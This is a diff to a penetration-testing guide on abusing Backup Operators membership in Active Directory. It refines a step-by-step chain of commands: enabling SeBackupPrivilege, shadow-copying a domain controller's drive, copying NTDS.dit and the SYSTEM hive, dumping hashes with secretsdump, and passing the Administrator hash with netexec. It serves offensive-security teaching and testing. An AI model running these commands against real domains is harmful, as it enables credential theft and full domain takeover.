@@ -78,7 +78,7 @@ This command reveals that `Server Operators` have full access, enabling the mani
 
 ## Backup Operators
 
-Membership in the `Backup Operators` group provides access to the `DC01` file system due to the `SeBackup` and `SeRestore` privileges. These privileges enable folder traversal, listing, and file copying capabilities, even without explicit permissions, using the `FILE_FLAG_BACKUP_SEMANTICS` flag. Utilizing specific scripts is necessary for this process.<sup>[[1]](#references)</sup>
+Membership in `Backup Operators` can grant `SeBackupPrivilege` and `SeRestorePrivilege` on a host, depending on its local policy and the logon session. Check the **effective token of the process running the commands** with `whoami /groups` and `whoami /priv`: membership alone does not prove that `SeBackupPrivilege` is present and enabled. If the privilege is present but disabled, it may be enabled in that token; if it is absent or removed, these backup operations cannot use it. `SeBackupPrivilege` supports protected **reads** through backup-aware APIs (for example, `FILE_FLAG_BACKUP_SEMANTICS` or `robocopy /B`); `SeRestorePrivilege` is a separate privilege for restore/write operations. Ordinary directory listings and copies do not necessarily use backup semantics.<sup>[[1]](#references)</sup>
 
 To list group members, execute:
 
@@ -88,7 +88,7 @@ Get-NetGroupMember -Identity "Backup Operators" -Recurse
 
 ### Local Attack
 
-To leverage these privileges locally, the following steps are employed:
+On a host where the effective token has `SeBackupPrivilege`, the following backup-aware copy can read a protected file:
 
 1. Import necessary libraries:
 
@@ -97,14 +97,14 @@ Import-Module .\SeBackupPrivilegeUtils.dll
 Import-Module .\SeBackupPrivilegeCmdLets.dll
 ```
 
-2. Enable and verify `SeBackupPrivilege`:
+2. If the privilege is present but disabled, enable it and verify its state in this process:
 
 ```bash
 Set-SeBackupPrivilege
 Get-SeBackupPrivilege
 ```
 
-3. Access and copy files from restricted directories, for instance:
+3. Copy a file from a restricted directory, for instance:
 
 ```bash
 dir C:\Users\Administrator\
@@ -113,11 +113,11 @@ Copy-FileSeBackupPrivilege C:\Users\Administrator\report.pdf c:\temp\x.pdf -Over
 
 ### AD Attack
 
-Direct access to the Domain Controller's file system allows for the theft of the `NTDS.dit` database, which contains all NTLM hashes for domain users and computers.
+`NTDS.dit` is the Active Directory database on a **domain controller (DC)**. This path requires a suitable token on the DC and access to the volume containing the database; Backup Operators membership elsewhere does not grant access to a particular DC. A live database is normally locked, so use an accessible shadow copy or another backup facility before copying it. Creating or exposing a shadow copy also depends on the host's VSS configuration and the caller's rights. The example below assumes the DC stores `NTDS.dit` on `C:` under `\Windows\NTDS`; adjust the volume and path if it does not.
 
 #### Using diskshadow.exe
 
-1. Create a shadow copy of the `C` drive:
+1. If permitted, create and expose a shadow copy of the DC's `C:` drive as `F:`:
 
 ```cmd
 diskshadow.exe
@@ -135,36 +135,36 @@ exit
 2. Copy `NTDS.dit` from the shadow copy:
 
 ```cmd
-Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
+mkdir C:\Tools
+Copy-FileSeBackupPrivilege F:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
 ```
 
 Alternatively, use `robocopy` for file copying:
 
 ```cmd
-robocopy /B F:\Windows\NTDS .\ntds ntds.dit
+robocopy /B F:\Windows\NTDS C:\Tools ntds.dit
 ```
 
-3. Extract `SYSTEM` and `SAM` for hash retrieval:
+3. Save the DC's `SYSTEM` hive for offline extraction. `SAM` is the local account database on member systems; a DC's `SAM` hive is not a substitute for `NTDS.dit` or a source of the domain Administrator hash:
 
 ```cmd
-reg save HKLM\SYSTEM SYSTEM.SAV
-reg save HKLM\SAM SAM.SAV
+reg save HKLM\SYSTEM C:\Tools\SYSTEM.SAV
 ```
 
-4. Retrieve all hashes from `NTDS.dit`:
+4. Transfer `ntds.dit` and `SYSTEM.SAV` to the analysis host and extract domain account hashes. A saved `SAM` hive from a member system, with its matching `SYSTEM` hive, yields local account hashes instead:
 
 ```shell-session
-secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
+secretsdump.py -ntds ntds.dit -system SYSTEM.SAV LOCAL
 ```
 
-5. Post-extraction: Pass-the-Hash to DA<sup>[[11]](#references)</sup>
+5. If a **domain** Administrator hash was recovered from `NTDS.dit`, it can be tested for domain authentication. A local Administrator hash from `SAM.SAV` is a different credential and does not authenticate as the domain Administrator.<sup>[[11]](#references)</sup>
 
 ```bash
-# Use the recovered Administrator NT hash to authenticate without the cleartext password
-netexec winrm <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"
+# Use the recovered domain Administrator NT hash to authenticate without the cleartext password
+netexec winrm <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> -x "whoami"
 
 # Or execute via SMB using an exec method
-netexec smb <DC_FQDN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
+netexec smb <DC_FQDN> -d <DOMAIN> -u Administrator -H <ADMIN_NT_HASH> --exec-method smbexec -x cmd
 ```
 
 #### Using wbadmin.exe
